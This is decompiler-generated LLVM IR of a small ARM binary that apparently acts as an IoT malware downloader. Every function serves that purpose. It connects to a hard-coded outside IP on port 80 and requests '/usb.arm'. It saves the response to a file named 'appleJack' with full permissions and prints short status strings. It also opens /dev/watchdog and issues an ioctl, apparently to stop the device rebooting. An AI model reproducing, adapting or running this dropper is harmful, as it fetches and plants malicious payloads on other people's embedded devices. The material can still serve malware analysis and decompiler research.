source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@global_var_8494.9 = constant [4 x i8] c"arm\00"
@global_var_8498.11 = constant [7 x i8] c"APPLE\0A\00"
@global_var_84a0.15 = constant [10 x i8] c"appleJack\00"
@global_var_80b4.16 = constant i32 -509603840
@global_var_84ac.18 = constant [5 x i8] c"NIF\0A\00"
@global_var_84b4.20 = constant [26 x i8] c"GET /usb.arm HTTP/1.0\0D\0A\0D\0A\00"
@global_var_84d0.23 = constant [6 x i8] c"JACK\0A\00"
@global_var_84d8.25 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_84e8.27 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_104fc.31 = global i32 0

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8074(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %v1_8094 = mul i32 %arg3, 65536
  %v3_809c = and i32 %v1_8094, 16711680
  %tmp = mul i32 %arg2, 256
  %v3_80a0 = and i32 %tmp, 65280
  %v4_80a4 = urem i32 %arg1, 256
  %v5_80a4 = or i32 %v3_80a0, %v4_80a4
  %v4_80a8 = mul i32 %arg4, 16777216
  %v5_80a8 = or i32 %v4_80a8, %v3_809c
  %v2_80ac = or i32 %v5_80a4, %v5_80a8
  ret i32 %v2_80ac
}

define i32 @function_80b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80b4:
  %v2_80bc = call i32 @function_839c(i32 9437185, i32 %arg1)
  %v0_80c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80c0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_80b4
  %v3_80c0 = add i32 %v2_80bc, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_80b4, %bb
  %v11_80c0 = phi i32 [ %v2_80bc, %dec_label_pc_80b4 ], [ %v3_80c0, %bb ]
  ret i32 %v11_80c0

; uselistorder directives
  uselistorder i32 %v2_80bc, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_80c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80c4:
  %v2_80cc = call i32 @function_839c(i32 9437190, i32 %arg1)
  %v0_80d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80d0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_80c4
  %v2_80d0 = load i32, i32* @r6, align 4
  %v3_80d0 = add i32 %v2_80d0, %v2_80cc
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_80c4, %bb
  %v11_80d0 = phi i32 [ %v2_80cc, %dec_label_pc_80c4 ], [ %v3_80d0, %bb ]
  ret i32 %v11_80d0

; uselistorder directives
  uselistorder i32 %v2_80cc, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_80d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80d4:
  %v2_80e8 = call i32 @function_839c(i32 9437189, i32 %arg1)
  %v0_80ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80ec, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_80d4
  %v2_80ec = load i32, i32* @r5, align 4
  %v3_80ec = add i32 %v2_80ec, %v2_80e8
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_80d4, %bb
  %v11_80ec = phi i32 [ %v2_80e8, %dec_label_pc_80d4 ], [ %v3_80ec, %bb ]
  ret i32 %v11_80ec

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_80f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80f0:
  %v2_8108 = call i32 @function_839c(i32 9437286, i32 3)
  ret i32 %v2_8108
}

define i32 @function_8118(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8118:
  store i32 %arg2, i32* @r2, align 4
  %v2_812c = call i32 @function_839c(i32 9437188, i32 %arg1)
  %v0_8130 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8130, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8118
  %v2_8130 = load i32, i32* @r4, align 4
  %v3_8130 = add i32 %v2_8130, %v2_812c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8118, %bb
  %v11_8130 = phi i32 [ %v2_812c, %dec_label_pc_8118 ], [ %v3_8130, %bb ]
  ret i32 %v11_8130

; uselistorder directives
  uselistorder i32 %v2_812c, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8134(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8134:
  store i32 %arg3, i32* @r3, align 4
  %v2_8148 = call i32 @function_839c(i32 9437187, i32 %arg1)
  %v0_814c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_814c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8134
  %v2_814c = load i32, i32* @r3, align 4
  %v3_814c = add i32 %v2_814c, %v2_8148
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8134, %bb
  %v11_814c = phi i32 [ %v2_8148, %dec_label_pc_8134 ], [ %v3_814c, %bb ]
  ret i32 %v11_814c

; uselistorder directives
  uselistorder i32 %v2_8148, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8150(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8150:
  %v2_8168 = call i32 @function_839c(i32 9437286, i32 1)
  ret i32 %v2_8168

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_839c, { 1, 5, 3, 0, 4, 6, 2 }
}

define i32 @function_8178() local_unnamed_addr {
dec_label_pc_8188.lr.ph:
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v3_8178 = load i32, i32* @r4, align 4
  %v9_8178 = load i32, i32* @r6, align 4
  br label %dec_label_pc_8188

dec_label_pc_8188:                                ; preds = %dec_label_pc_8188.lr.ph, %dec_label_pc_8188
  %v0_8188 = phi i32 [ ptrtoint ([4 x i8]* @global_var_8494.9 to i32), %dec_label_pc_8188.lr.ph ], [ %v1_8188, %dec_label_pc_8188 ]
  %v1_8188 = add i32 %v0_8188, 1
  store i32 %v1_8188, i32* @r4, align 4
  %v1_818c = inttoptr i32 %v1_8188 to i8*
  %v2_818c = load i8, i8* %v1_818c, align 1
  %v3_818c = zext i8 %v2_818c to i32
  store i32 %v3_818c, i32* @r6, align 4
  %v2_8190 = icmp eq i8 %v2_818c, 0
  br i1 %v2_8190, label %dec_label_pc_8198, label %dec_label_pc_8188

dec_label_pc_8198:                                ; preds = %dec_label_pc_8188
  %v2_8180 = ptrtoint i32* %stack_var_-172 to i32
  %v2_81a8 = sub i32 %v1_8188, ptrtoint ([4 x i8]* @global_var_8494.9 to i32)
  store i32 %v2_81a8, i32* %r8.global-to-local, align 4
  %v4_81ac = call i32 @function_8118(i32 1, i32 ptrtoint ([7 x i8]* @global_var_8498.11 to i32), i32 6)
  store i32 2, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_81d0 = load i32, i32* @r6, align 4
  %sext = mul i32 %v0_81d0, 16777216
  %v8_81d8 = sdiv i32 %sext, 16777216
  %v11_81d8 = call i32 @function_8074(i32 185, i32 167, i32 78, i32 57, i32 2, i32 %v8_81d8, i32 %v8_81d8, i32 80)
  %v4_81ec = call i32 @function_80d4(i32 ptrtoint ([10 x i8]* @global_var_84a0.15 to i32), i32 577, i32 511)
  store i32 %v4_81ec, i32* %r7.global-to-local, align 4
  %v0_81f8 = load i32, i32* @r6, align 4
  %v0_81fc = load i32, i32* @r4, align 4
  %v3_8200 = call i32 @function_8150(i32 %v0_81fc, i32 1, i32 %v0_81f8)
  %v7_8204 = icmp eq i32 %v3_8200, -1
  br i1 %v7_8204, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_8198
  store i32 -1, i32* @r5, align 4
  br label %bb24

bb:                                               ; preds = %dec_label_pc_8198
  %v1_8208 = load i32, i32* %r7.global-to-local, align 4
  %v8_8208 = icmp eq i32 %v1_8208, -1
  store i32 %v3_8200, i32* @r5, align 4
  br i1 %v8_8208, label %bb24, label %bb25

bb24:                                             ; preds = %.thread, %bb
  br label %bb25

bb25:                                             ; preds = %bb, %bb24
  %v0_8214 = phi i1 [ false, %bb ], [ true, %bb24 ]
  call void @__pseudo_cond_branch(i1 %v0_8214, i32 ptrtoint (i32* @global_var_80b4.16 to i32))
  %v0_8218 = load i32, i32* @r5, align 4
  %v2_821c = ptrtoint i32* %stack_var_-44 to i32
  %v3_8224 = call i32 @function_80f0(i32 %v0_8218, i32 %v2_821c, i32 16)
  store i32 %v3_8224, i32* @r4, align 4
  %v1_8228 = icmp slt i32 %v3_8224, 0
  br i1 %v1_8228, label %dec_label_pc_8230, label %dec_label_pc_8248

dec_label_pc_8230:                                ; preds = %bb25
  %v4_823c = call i32 @function_8118(i32 1, i32 ptrtoint ([5 x i8]* @global_var_84ac.18 to i32), i32 4)
  %v0_8240 = load i32, i32* @r4, align 4
  %v1_8240 = sub i32 0, %v0_8240
  %v1_8244 = call i32 @function_80b4(i32 %v1_8240)
  br label %dec_label_pc_8248

dec_label_pc_8248:                                ; preds = %bb25, %dec_label_pc_8230
  %v0_8248 = load i32, i32* %r8.global-to-local, align 4
  %v1_8248 = add i32 %v0_8248, 29
  store i32 %v1_8248, i32* @r4, align 4
  %v0_824c = load i32, i32* @r5, align 4
  %v4_8258 = call i32 @function_8118(i32 %v0_824c, i32 ptrtoint ([26 x i8]* @global_var_84b4.20 to i32), i32 %v1_8248)
  %v1_825c = load i32, i32* @r4, align 4
  %v9_825c = icmp eq i32 %v4_8258, %v1_825c
  br i1 %v9_825c, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_8248
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_8248, %bb26
  %v1_8264 = xor i1 %v9_825c, true
  call void @__pseudo_cond_branch(i1 %v1_8264, i32 ptrtoint (i32* @global_var_80b4.16 to i32))
  %v0_8268 = load i32, i32* @r6, align 4
  store i32 %v0_8268, i32* @r4, align 4
  %v2_826c = ptrtoint i8* %stack_var_-25 to i32
  br label %dec_label_pc_826c

dec_label_pc_826c:                                ; preds = %dec_label_pc_826c, %bb27
  %v0_8274 = load i32, i32* @r5, align 4
  %v3_8278 = call i32 @function_8134(i32 %v0_8274, i32 %v2_826c, i32 1)
  %v1_8284 = icmp ne i32 %v3_8278, 1
  call void @__pseudo_cond_branch(i1 %v1_8284, i32 ptrtoint (i32* @global_var_80b4.16 to i32))
  %v3_8288 = load i8, i8* %stack_var_-25, align 1
  %v4_8288 = sext i8 %v3_8288 to i32
  %v1_828c = load i32, i32* @r4, align 4
  %v4_828c = mul i32 %v1_828c, 256
  %v5_828c = or i32 %v4_828c, %v4_8288
  store i32 %v5_828c, i32* @r4, align 4
  %v9_8294 = icmp eq i32 %v5_828c, 218762506
  br i1 %v9_8294, label %dec_label_pc_829c.preheader, label %dec_label_pc_826c

dec_label_pc_829c.preheader:                      ; preds = %dec_label_pc_826c
  %v0_82a430 = load i32, i32* @r5, align 4
  %v3_82a831 = call i32 @function_8134(i32 %v0_82a430, i32 %v2_8180, i32 128)
  store i32 %v2_8180, i32* @r4, align 4
  %v0_82b833 = load i32, i32* %r7.global-to-local, align 4
  %tmp2934 = icmp slt i32 %v3_82a831, 1
  br i1 %tmp2934, label %dec_label_pc_82c8, label %dec_label_pc_82c0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_829c.preheader, %dec_label_pc_82c0
  %v0_82b836 = phi i32 [ %v0_82b8, %dec_label_pc_82c0 ], [ %v0_82b833, %dec_label_pc_829c.preheader ]
  %v3_82a835 = phi i32 [ %v3_82a8, %dec_label_pc_82c0 ], [ %v3_82a831, %dec_label_pc_829c.preheader ]
  %v3_82c0 = call i32 @function_8118(i32 %v0_82b836, i32 %v2_8180, i32 %v3_82a835)
  %v0_82a4 = load i32, i32* @r5, align 4
  %v3_82a8 = call i32 @function_8134(i32 %v0_82a4, i32 %v2_8180, i32 128)
  store i32 %v2_8180, i32* @r4, align 4
  %v0_82b8 = load i32, i32* %r7.global-to-local, align 4
  %tmp29 = icmp slt i32 %v3_82a8, 1
  br i1 %tmp29, label %dec_label_pc_82c8, label %dec_label_pc_82c0

dec_label_pc_82c8:                                ; preds = %dec_label_pc_82c0, %dec_label_pc_829c.preheader
  %v0_82c8 = load i32, i32* @r5, align 4
  %v1_82cc = call i32 @function_80c4(i32 %v0_82c8)
  %v0_82d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_82d4 = call i32 @function_80c4(i32 %v0_82d0)
  %v4_82e4 = call i32 @function_8118(i32 1, i32 ptrtoint ([6 x i8]* @global_var_84d0.23 to i32), i32 5)
  %v1_82ec = call i32 @function_80b4(i32 5)
  store i32 %v3_8178, i32* @r4, align 4
  store i32 %v9_8178, i32* @r6, align 4
  ret i32 %v1_82ec

; uselistorder directives
  uselistorder i32 %v3_82a8, { 1, 0 }
  uselistorder i32 %v3_8200, { 1, 0 }
  uselistorder i32 %v2_8180, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_8188, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i8* %stack_var_-25, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 128, { 1, 0 }
  uselistorder i32 256, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_8134, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_80b4, { 1, 0 }
  uselistorder i32* @r5, { 3, 4, 0, 5, 6, 7, 8, 1, 2 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_8118, { 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8494.9 to i32), { 1, 0 }
  uselistorder i32* @r6, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_82c0, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %dec_label_pc_8248, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %dec_label_pc_8188, { 1, 0 }
}

define i32 @function_8300(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8300:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_8300 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8300, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_8300
  %v5_8300 = sdiv i32 %arg2, 16
  %v6_8300 = and i32 %v5_8300, %tmp
  store i32 %v6_8300, i32* %r0.global-to-local, align 4
  %v4_8304 = inttoptr i32 %v6_8300 to i32*
  store i32 %v6_8300, i32* %v4_8304, align 4
  %v5_8304 = load i32, i32* %r0.global-to-local, align 4
  %v6_8304 = add i32 %v5_8304, -33548
  store i32 %v6_8304, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_8300, %bb
  %v7_8304 = phi i32 [ %tmp, %dec_label_pc_8300 ], [ %v6_8304, %bb ]
  ret i32 %v7_8304

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_831c(i32 %arg1) local_unnamed_addr {
dec_label_pc_831c:
  %stack_var_-12 = alloca i32, align 4
  %v2_8324 = ptrtoint i32* %stack_var_-12 to i32
  %v4_832c = call i32 @function_841c(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_84d8.25, i32 0, i32 0), i32 2)
  store i32 %v4_832c, i32* @r4, align 4
  %v3_8334 = icmp eq i32 %v4_832c, -1
  br i1 %v3_8334, label %dec_label_pc_8344, label %dec_label_pc_8354

dec_label_pc_8344:                                ; preds = %dec_label_pc_831c
  %v4_8344 = call i32 @function_841c(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_84e8.27, i32 0, i32 0), i32 2)
  %v7_8348 = icmp eq i32 %v4_8344, -1
  store i32 %v4_8344, i32* @r4, align 4
  br i1 %v7_8348, label %dec_label_pc_8378, label %dec_label_pc_8354

dec_label_pc_8354:                                ; preds = %dec_label_pc_831c, %dec_label_pc_8344
  %v0_8360 = phi i32 [ %v4_832c, %dec_label_pc_831c ], [ %v4_8344, %dec_label_pc_8344 ]
  store i32 1, i32* %stack_var_-12, align 4
  %v5_836c = call i32 @function_83cc(i32 %v0_8360, i32 -2147199228, i32 %v2_8324, i32 1, i32 1)
  %v0_8370 = load i32, i32* @r4, align 4
  %v1_8374 = call i32 @function_80c4(i32 %v0_8370)
  br label %dec_label_pc_8378

dec_label_pc_8378:                                ; preds = %dec_label_pc_8344, %dec_label_pc_8354
  %v8_837c = phi i32 [ -1, %dec_label_pc_8344 ], [ %v1_8374, %dec_label_pc_8354 ]
  ret i32 %v8_837c

; uselistorder directives
  uselistorder i32 %v4_8344, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_80c4, { 2, 1, 0 }
  uselistorder i32* @r4, { 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 2, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8378, { 1, 0 }
  uselistorder label %dec_label_pc_8354, { 1, 0 }
}

define i32 @entry_point() local_unnamed_addr {
entry:
  %v0_8390 = call i32 @function_8178()
  %v1_8398 = call i32 @function_831c(i32 %v0_8390)
  ret i32 %v1_8398
}

define i32 @function_839c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_839c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_83a8 = call i32 (i32, ...) @syscall(i32 %arg1)
  %v7_83ac = icmp eq i32 %v1_83a8, -4096
  store i1 %v7_83ac, i1* @cpsr_z, align 1
  store i32 %v1_83a8, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_83a8, -4095
  br i1 %tmp8, label %bb, label %bb7

bb:                                               ; preds = %dec_label_pc_839c
  ret i32 %v1_83a8

bb7:                                              ; preds = %dec_label_pc_839c
  %v0_83b8 = call i32 @function_8488()
  %v0_83bc = load i32, i32* %r4.global-to-local, align 4
  %v1_83bc = sub i32 0, %v0_83bc
  store i32 %v1_83bc, i32* @r3, align 4
  %v2_83c0 = inttoptr i32 %v0_83b8 to i32*
  store i32 %v1_83bc, i32* %v2_83c0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_83a8, { 3, 0, 2, 1 }
  uselistorder i32* @r3, { 1, 0, 2 }
}

define i32 @function_83cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_83cc:
  %r4.global-to-local = alloca i32, align 4
  %v2_83e8 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_83e8, i32* %r4.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_83e8, -4095
  br i1 %tmp9, label %dec_label_pc_8408, label %dec_label_pc_83f8

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83cc
  %v0_83f8 = call i32 @function_8488()
  %v0_83fc = load i32, i32* %r4.global-to-local, align 4
  %v1_83fc = sub i32 0, %v0_83fc
  %v2_8400 = inttoptr i32 %v0_83f8 to i32*
  store i32 %v1_83fc, i32* %v2_8400, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8408

dec_label_pc_8408:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_83f8
  %v0_8408 = phi i32 [ %v2_83e8, %dec_label_pc_83cc ], [ -1, %dec_label_pc_83f8 ]
  ret i32 %v0_8408

; uselistorder directives
  uselistorder i32 %v2_83e8, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8408, { 1, 0 }
}

define i32 @function_841c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_841c:
  %r4.global-to-local = alloca i32, align 4
  %v1_842c = and i32 %arg2, 64
  %v2_842c = icmp eq i32 %v1_842c, 0
  br i1 %v2_842c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_841c
  %v6_841c = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_841c, 65536
  br label %.thread

.thread:                                          ; preds = %bb, %dec_label_pc_841c
  %v0_843c = phi i32 [ %phitmp, %bb ], [ 0, %dec_label_pc_841c ]
  store i32 %v0_843c, i32* @r2, align 4
  %v4_8444 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_8448 = icmp eq i32 %v4_8444, -4096
  store i1 %v7_8448, i1* @cpsr_z, align 1
  store i32 %v4_8444, i32* %r4.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8444, -4095
  br i1 %tmp11, label %dec_label_pc_8464, label %dec_label_pc_8454

dec_label_pc_8454:                                ; preds = %.thread
  %v0_8454 = call i32 @function_8488()
  %v0_8458 = load i32, i32* %r4.global-to-local, align 4
  %v1_8458 = sub i32 0, %v0_8458
  %v2_845c = inttoptr i32 %v0_8454 to i32*
  store i32 %v1_8458, i32* %v2_845c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8464

dec_label_pc_8464:                                ; preds = %.thread, %dec_label_pc_8454
  %v0_8464 = phi i32 [ %v4_8444, %.thread ], [ -1, %dec_label_pc_8454 ]
  ret i32 %v0_8464

; uselistorder directives
  uselistorder i32 %v4_8444, { 2, 0, 3, 1 }
  uselistorder i32 -1, { 6, 9, 7, 10, 0, 2, 3, 8, 4, 1, 5 }
  uselistorder i32 ()* @function_8488, { 2, 1, 0 }
  uselistorder i32 1, { 1, 3, 4, 9, 10, 12, 19, 2, 13, 8, 7, 0, 14, 15, 11, 16, 22, 21, 20, 18, 5, 6, 17 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8464, { 1, 0 }
}

define i32 @function_8478(i32 %arg1) local_unnamed_addr {
dec_label_pc_8478:
  store i32 %arg1, i32* @r2, align 4
  %v3_8480 = call i32 @function_841c(i8* null, i32 577)
  %v0_8484 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8484, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8478
  %v6_8484 = and i32 %v3_8480, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8478, %bb
  %v7_8484 = phi i32 [ %v3_8480, %dec_label_pc_8478 ], [ %v6_8484, %bb ]
  ret i32 %v7_8484

; uselistorder directives
  uselistorder i1* @cpsr_z, { 0, 7, 8, 1, 2, 3, 4, 5, 6 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8488() local_unnamed_addr {
dec_label_pc_8488:
  ret i32 ptrtoint (i32* @global_var_104fc.31 to i32)

; uselistorder directives
  uselistorder i32 0, { 6, 0, 7, 8, 9, 1, 2, 3, 4, 10, 11, 5, 12, 13, 14, 15, 16 }
}

declare i32 @syscall(i32, ...) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr
